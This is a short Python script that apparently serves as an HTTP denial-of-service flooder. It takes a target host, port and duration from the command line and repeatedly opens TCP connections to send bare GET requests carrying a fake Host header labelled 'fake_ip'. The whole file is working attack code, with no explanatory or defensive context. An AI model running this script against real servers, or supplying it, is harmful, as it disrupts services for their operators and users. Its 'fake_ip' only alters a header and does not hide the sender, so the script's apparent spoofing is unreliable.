import sys
import time
import socket
target = sys.argv[1]
port = int(sys.argv[2])
att_time = int(sys.argv[3])
start_time = time.time()
fake_ip = '182.21.20.32'

while time.time() < start_time+att_time:
    s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
    s.connect((target, port))
    s.sendto(("GET /" + target + " HTTP/1.1\r\n").encode('ascii'), (target, port))
    s.sendto(("Host: " + fake_ip + "\r\n\r\n").encode('ascii'), (target, port))
    s.close()
